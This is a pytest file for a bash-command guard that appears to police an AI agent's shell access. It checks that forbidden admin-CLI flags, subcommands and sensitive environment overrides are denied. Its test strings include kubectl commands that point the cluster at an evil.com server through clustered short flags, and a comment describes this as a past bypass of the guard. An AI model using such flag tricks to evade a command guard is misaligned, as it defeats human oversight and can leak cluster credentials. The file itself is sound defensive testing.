# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 TracineHQ contributors
"""Derived coverage matrix for the admin-CLI forbidden layer.

Hand-enumerated red-team tests (``test_admin_red_team_shapes.py``) pick a
handful of high-value flags per CLI. This module instead DERIVES one deny
assertion per declared fence in every ``AdminCliSpec`` -- so a newly-declared
``forbidden_flag`` / ``forbidden_subcommand`` / ``sensitive_env_var`` that the
hand-written matchers fail to enforce flips a matrix cell red instead of
shipping a silent bypass. New spec entries auto-generate new cells; nobody has
to remember to add a point test.

Same philosophy as ``test_git_write_coverage.py``: bound the surface (the spec
frozensets), enumerate it, and assert the SPECIFIC declared mechanism fires
(by rule_id) -- a coincidental deny by an unrelated matcher would let the real
regression through, so an outcome-only check is not enough for the flag/env
cells.

The admin forbidden layer is a both-mode floor (``_match_admin_forbidden_layers``
runs inside ``_match_synthetic_deny`` for every permission mode), so the matrix
asserts in the most permissive mode (``default``): a deny there is the strongest
guarantee.
"""

from __future__ import annotations

import re
from typing import TYPE_CHECKING

import pytest

from guard.hooks._admin_specs import ADMIN_CLI_SPECS
from guard.hooks.bash_command_validator import decide

if TYPE_CHECKING:
    from guard.hooks._admin_specs import AdminCliSpec

_RULE_RE = re.compile(r"denied: (bash\.[a-z0-9_]+)")


def _rule_id(result: dict[str, str] | None) -> str | None:
    """Extract the emitted ``bash.*`` rule_id from a decide() deny envelope."""
    if not result or result.get("permissionDecision") != "deny":
        return None
    match = _RULE_RE.search(result.get("permissionDecisionReason", ""))
    return match.group(1) if match else None


def _is_deny(result: dict[str, str] | None) -> bool:
    return result is not None and result.get("permissionDecision") == "deny"


def _slug(flag: str) -> str:
    """Stable, collision-free id fragment for a flag/var (``--v`` vs ``-v``)."""
    return re.sub(r"[^a-z0-9]", "_", flag.lower())


def _concrete_env(var: str) -> str:
    """Concretize a ``*``-suffixed prefix-match env var to a real name."""
    return var[:-1] + "X" if var.endswith("*") else var


def _base_argv(spec: AdminCliSpec) -> list[str]:
    """A deterministic representative READ-ONLY invocation for the CLI.

    Forbidden flags / env-vars are attached to this benign base so a deny is
    attributable to the fence under test, not to the verb being non-read-only.
    ``min`` over the frozenset of verb tuples is stable across runs.
    """
    verb = min(spec.read_only_verbs)
    return [spec.cli_name, *verb]


def _spec_by_name(name: str) -> AdminCliSpec:
    return next(s for s in ADMIN_CLI_SPECS if s.cli_name == name)


# --------------------------------------------------------------------------
# Cell derivation (collection time)
# --------------------------------------------------------------------------

_FLAG_CASES: list[pytest.ParameterSet] = []
_ENV_CASES: list[pytest.ParameterSet] = []
_SUBCMD_CASES: list[pytest.ParameterSet] = []
_SUBCMD_FLAG_PATH_CASES: list[pytest.ParameterSet] = []
_PARITY_CASES: list[pytest.ParameterSet] = []
_WRAPPER_CASES: list[pytest.ParameterSet] = []

for _spec in ADMIN_CLI_SPECS:
    _cli = _spec.cli_name
    _base = " ".join(_base_argv(_spec))
    _PARITY_CASES.append(pytest.param(_base, id=f"{_cli}-base-read-only"))

    # forbidden flags: fused (--flag=X) and space (--flag X) -- exercises both
    # the "=" split branch and the bare-token branch of _check_admin_forbidden_flag.
    for _flag in sorted(_spec.forbidden_flags):
        _sl = _slug(_flag)
        _FLAG_CASES.append(pytest.param(f"{_base} {_flag}=X", _cli, id=f"{_cli}-{_sl}-fused"))
        _FLAG_CASES.append(pytest.param(f"{_base} {_flag} X", _cli, id=f"{_cli}-{_sl}-space"))
        # Short value flags (``-s``) accept a glued value (``-sVALUE``) under
        # pflag/getopt with no ``=``. That form must deny too -- it was the
        # fused-short bypass: ``kubectl get pods -shttps://evil`` redirects the
        # cluster while ``--server https://evil`` denies.
        if len(_flag) == 2 and _flag[0] == "-" and _flag[1] != "-":
            _FLAG_CASES.append(
                pytest.param(f"{_base} {_flag}VALUE", _cli, id=f"{_cli}-{_sl}-fused-short")
            )

    # sensitive env vars: inline assignment before the CLI binary.
    for _var in sorted(_spec.sensitive_env_vars):
        _cvar = _concrete_env(_var)
        _ENV_CASES.append(pytest.param(f"{_cvar}=X {_base}", _cli, id=f"{_cli}-{_slug(_cvar)}-env"))

    # forbidden subcommands: split flag-bearing paths (e.g. az
    # ("login", "--service-principal")) from all-positional paths -- the former
    # can only be enforced via default-deny, so it gets an outcome-only check.
    for _path in sorted(_spec.forbidden_subcommands):
        _cmd = f"{_cli} {' '.join(_path)}"
        _pid = _slug("_".join(_path))
        if any(p.startswith("-") for p in _path):
            _SUBCMD_FLAG_PATH_CASES.append(pytest.param(_cmd, id=f"{_cli}-{_pid}"))
        else:
            _SUBCMD_CASES.append(pytest.param(_cmd, _cli, id=f"{_cli}-{_pid}"))

    # wrapper axis: one forbidden flag per CLI, peeled through env-prefix and
    # runner wrappers -- fences _candidate_forms' stripping for the admin layer.
    _flags = sorted(_spec.forbidden_flags)
    if _flags:
        _f = _flags[0]
        _cmd_flag = f"{_base} {_f}=X"
        _WRAPPER_CASES.append(
            pytest.param(f"GUARD_BENIGN=1 {_cmd_flag}", _cli, id=f"{_cli}-{_slug(_f)}-env-prefix")
        )
        _WRAPPER_CASES.append(
            pytest.param(f"timeout 5 {_cmd_flag}", _cli, id=f"{_cli}-{_slug(_f)}-timeout")
        )
        _WRAPPER_CASES.append(
            pytest.param(f"sudo {_cmd_flag}", _cli, id=f"{_cli}-{_slug(_f)}-sudo")
        )


# --------------------------------------------------------------------------
# Tests
# --------------------------------------------------------------------------


def test_matrix_is_non_empty() -> None:
    """Guard against a derivation bug silently producing zero cells."""
    assert _FLAG_CASES, "no forbidden-flag cells derived"
    assert _ENV_CASES, "no sensitive-env cells derived"
    assert _SUBCMD_CASES, "no forbidden-subcommand cells derived"


@pytest.mark.parametrize("command", _PARITY_CASES)
def test_read_only_base_is_not_denied(command: str) -> None:
    """Anti-vacuous: every representative read-only base passes in default mode.

    If a base denied on its own, the forbidden-layer denies below would be
    unattributable -- the matrix would prove nothing.
    """
    assert not _is_deny(decide(command)), f"read-only base unexpectedly denied: {command!r}"


@pytest.mark.parametrize(("command", "cli"), [(p.values[0], p.values[1]) for p in _FLAG_CASES])
def test_forbidden_flag_denied(command: str, cli: str) -> None:
    result = decide(command)
    assert _is_deny(result), f"forbidden flag not denied: {command!r}"
    assert _rule_id(result) == "bash.admin_forbidden_flag", (
        f"{command!r} denied by {_rule_id(result)!r}, not bash.admin_forbidden_flag "
        "-- declared forbidden_flag is enforced (if at all) by a coincidental matcher"
    )


@pytest.mark.parametrize(("command", "cli"), [(p.values[0], p.values[1]) for p in _ENV_CASES])
def test_sensitive_env_var_denied(command: str, cli: str) -> None:
    result = decide(command)
    assert _is_deny(result), f"sensitive env var not denied: {command!r}"
    assert _rule_id(result) == "bash.admin_sensitive_env_override", (
        f"{command!r} denied by {_rule_id(result)!r}, not bash.admin_sensitive_env_override"
    )


@pytest.mark.parametrize(("command", "cli"), [(p.values[0], p.values[1]) for p in _SUBCMD_CASES])
def test_forbidden_subcommand_denied(command: str, cli: str) -> None:
    result = decide(command)
    assert _is_deny(result), f"forbidden subcommand not denied: {command!r}"
    assert _rule_id(result) == "bash.admin_forbidden_subcommand", (
        f"{command!r} denied by {_rule_id(result)!r}, not bash.admin_forbidden_subcommand"
    )


@pytest.mark.parametrize("command", [p.values[0] for p in _SUBCMD_FLAG_PATH_CASES])
def test_flag_bearing_forbidden_subcommand_is_at_least_denied(command: str) -> None:
    """Flag-bearing forbidden_subcommand paths (e.g. ``az login --service-principal``)
    can't match ``_check_admin_forbidden_subcommand`` (it filters flags out of the
    positional sequence). They must still DENY -- via default-deny -- so the
    outcome is safe even though the declared mechanism is unreachable.
    """
    assert _is_deny(decide(command)), f"flag-bearing forbidden path not denied: {command!r}"


@pytest.mark.parametrize(("command", "cli"), [(p.values[0], p.values[1]) for p in _WRAPPER_CASES])
def test_forbidden_flag_denied_through_wrapper(command: str, cli: str) -> None:
    """Env-prefix and runner wrappers must not hide a forbidden flag.

    ``_candidate_forms`` peels these; the admin layer must still fire on a
    peeled form.
    """
    assert _is_deny(decide(command)), f"wrapper hid a forbidden flag: {command!r}"


# pflag clusters a forbidden short flag behind a boolean shorthand
# (``-Ashttps://evil`` == ``-A -s https://evil``). Not derivable from
# forbidden_flags alone (it needs a leading boolean), so enumerated explicitly.
@pytest.mark.parametrize(
    "command",
    [
        pytest.param("kubectl get pods -Ashttps://evil.com", id="kubectl-cluster-As-fused"),
        pytest.param("kubectl get pods -As https://evil.com", id="kubectl-cluster-As-space"),
        pytest.param("kubectl get pods -wshttps://evil.com", id="kubectl-cluster-ws-fused"),
        pytest.param("kubectl get pods -Av9", id="kubectl-cluster-Av-fused"),
    ],
)
def test_clustered_short_forbidden_flag_denied(command: str) -> None:
    result = decide(command)
    assert _is_deny(result), f"clustered short flag not denied: {command!r}"
    assert _rule_id(result) == "bash.admin_forbidden_flag", (
        f"{command!r} denied by {_rule_id(result)!r}, not bash.admin_forbidden_flag"
    )


# Anti-FP floor: safe fused/clustered shorts whose letters happen to include a
# forbidden one INSIDE a value (``-ojson`` has an ``s``) must still pass.
@pytest.mark.parametrize(
    "command",
    [
        pytest.param("kubectl get pods -ojson", id="safe-ojson"),
        pytest.param("kubectl get pods -nkube-system", id="safe-nkube-system"),
        pytest.param("kubectl get pods -lapp=web", id="safe-lapp"),
        pytest.param("kubectl get pods -A", id="safe-A"),
        pytest.param("kubectl get pods -Aw", id="safe-Aw"),
        pytest.param("kubectl get pods -owide", id="safe-owide"),
    ],
)
def test_safe_short_clusters_not_denied(command: str) -> None:
    assert not _is_deny(decide(command)), f"safe short cluster wrongly denied: {command!r}"
